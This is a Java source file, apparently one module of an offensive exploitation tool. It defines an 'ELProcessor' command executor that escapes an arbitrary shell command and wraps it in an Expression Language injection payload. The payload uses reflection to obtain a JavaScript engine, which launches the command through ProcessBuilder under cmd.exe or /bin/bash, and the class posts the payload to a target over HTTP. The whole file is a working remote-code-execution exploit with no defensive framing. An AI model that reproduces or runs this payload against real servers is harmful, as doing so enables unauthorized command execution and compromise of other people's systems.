package com.feihong.executor;

import com.feihong.bean.CommandExecutionResult;
import com.feihong.util.BasicSetting;
import com.feihong.util.WrappedHttpRequest;

public class ELProcessorCommandExecutor implements CommandExecutor{
    @Override
    public String getName() {
        return "ELProcessor";
    }

    @Override
    public CommandExecutionResult exec(String command) {
        command = command.replace("\\","\\\\\\\\");
        command = command.replaceAll("\n","\\\\\\\\n");
        command = command.replaceAll("'","\\\\\\\\\\\\\'");
        command = command.replaceAll("\"","\\\\\"");

        String wrappedCommand;
        if(command.equalsIgnoreCase("ipconfig") || command.trim().equalsIgnoreCase("ifconfig")){
            wrappedCommand = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                    ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder(['" + command + "'])" +
                    ".start().getInputStream()\")";
        }else{
            if(BasicSetting.getInstance().shellPlatform.trim().equalsIgnoreCase("windows")){
                wrappedCommand = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                        ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder(['cmd.exe','/c','" + command + "'])" +
                        ".start().getInputStream()\")";
            }else{
                wrappedCommand = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                        ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder(['/bin/bash','-c','" + command + "'])" +
                        ".start().getInputStream()\")";
            }
        }

        return WrappedHttpRequest.post(wrappedCommand);
    }
}
